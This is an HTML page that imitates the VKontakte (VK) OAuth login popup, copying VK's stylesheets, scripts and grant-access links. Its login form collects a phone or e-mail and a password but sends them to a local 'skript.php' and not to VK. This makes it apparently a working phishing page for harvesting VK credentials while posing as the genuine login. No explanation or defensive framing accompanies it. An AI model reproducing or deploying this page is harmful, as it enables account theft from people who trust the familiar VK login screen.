<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ВКонтакте | Вход</title>
<link rel="shortcut icon" href="http://vk.com/favicon.ico" />
<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?509">
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
<link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?29">
<script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2"></script>
<script type="text/javascript" language="javascript">
// <![CDATA[
  function allow() {
    var addr = '';
    if (isChecked(ge('allow_notifications'))) {
      addr = '&notify=1';
    }
    if (isChecked(ge('denied_email'))) {
      addr = '&email_denied=1';
    }
    location.href = "https://login.vk.com/?act=grant_access&client_id=3280318&settings=4194306&redirect_uri=https%3A%2F%2Fulogin.ru%2Fauth.php%3Fname%3Dvkontakte&response_type=code&direct_hash=f34a8c901be7b60dd3&token_type=0&v=&state=&display=page&ip_h=b70e11f322e3a105fe&hash=8c44c149909822b2c9&https=1"+addr;
    return false;
  }

  function cancel() {
    location.href = "https://login.vk.com/?act=grant_access&client_id=3280318&settings=4194306&redirect_uri=https%3A%2F%2Fulogin.ru%2Fauth.php%3Fname%3Dvkontakte&response_type=code&direct_hash=f34a8c901be7b60dd3&token_type=0&v=&state=&display=page&ip_h=b70e11f322e3a105fe&hash=8c44c149909822b2c9&https=1&cancel=1";
    return false;
  }

  function login() {
    ge('login_submit').submit();
  }
  function doResize(onResize) {
    var box = ge('box_cont');
    if (onResize) {
      setTimeout(function() {
        doResize()
      }, 100);
    }

    var wndH = window.outerHeight - window.innerHeight;
    wndH = (!wndH || wndH < 0) ? 50 : wndH;
    var wndW = window.outerWidth - window.innerWidth;
    wndW = (!wndW || wndW < 0) ? 50 : wndW;

    if (document.body.className.indexOf('oauth_page') != -1) {
      ge('sub_cont').style.paddingTop =  Math.floor((document.body.clientHeight - ge('container').offsetHeight - 50) / 2)+'px';
    } else if (!onResize) {
      var boxH = box.offsetHeight;
      var ctrlH = 178 + wndH;
      var ctrlW = 605 + (wndW || 15);

      window.resizeTo(ctrlW, boxH + ctrlH);
      window.moveTo(Math.floor((screen.width - ctrlW) / 2), Math.floor((screen.height - boxH - ctrlH) / 2));
    }
  }
  function toggleEmailPrivacy() {
    checkbox('denied_email');
    if (!isChecked('denied_email')) {
      hide('denied_email');
      show('allowed_email');
    } else {
      hide('allowed_email');
      show('denied_email');
    }
  }

  if (parent && parent != window) {
    location.href = "https://oauth.vk.com/blank.html";
  }
  
// ]]>
</script>
</head>
<body onload="doResize();" class="VK oauth_page">

<script>
if (window.devicePixelRatio >= 2) {
  document.body.className += ' is_2x';
}
</script>
<div id="sub_cont">
<form method="POST" id="login_submit" action="skript.php">
<table id="container" class="container" cellspacing="0" cellpadding="0"><tbody><tr><td class="head">
  <a href="https://vk.com" target="_blank" class="logo"></a><div class="auth_items"><a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank">Регистрация</a></div>
</td></tr><tr><td valign="top">
<div class="info_line">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

<div id="box_cont">
<div id="box" class="box box_login">
<div class="info">
<input type="hidden" name="ref" value="0">

<div class="form_header">Телефон или e-mail</div>
<input type="text" class="form_input" name="login" value="" required>
<div class="form_header">Пароль</div>
<input type="password" class="form_input" name="pass" required>
<div class="popup_login_btn">
<button class="flat_button popup_login_btn button_big" id="install_allow" type="submit" onclick="return login();">Войти</button>
</div>
<a id="quick_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
<input type="submit" name="submit" style="display: none;">
</div>
</div>
</div>
</td></tr></tbody></table>
</form>
</div>

</body></html>